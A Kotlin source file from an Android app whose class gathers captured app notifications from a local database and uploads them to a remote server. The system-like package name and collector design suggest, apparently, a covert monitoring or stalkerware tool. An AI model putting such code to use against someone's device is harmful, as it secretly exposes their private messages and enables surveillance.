package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.logVerbose

class AppNotificationsCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        if (AppConstants.syncAppNotifications) {
            logVerbose("${AppConstants.APP_NOTIFICATIONS_TYPE} Preparing for uploading")
            localDatabaseSource.getAppNotifications { logs ->
                if (logs.isNotEmpty()) {
                    logVerbose("${AppConstants.APP_NOTIFICATIONS_TYPE} data = $logs")
                    val startDate = logs[logs.size - 1].date
                    val endDate = logs[0].date
                    val serverHelper = RemoteServerHelper(
                        context,
                        AppConstants.APP_NOTIFICATIONS_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    serverHelper.upload(logs)
                } else {
                    logVerbose("${AppConstants.APP_NOTIFICATIONS_TYPE} No logs found")
                }
            }
        } else {
            logVerbose("${AppConstants.APP_NOTIFICATIONS_TYPE} sync is Off")
        }
    }
}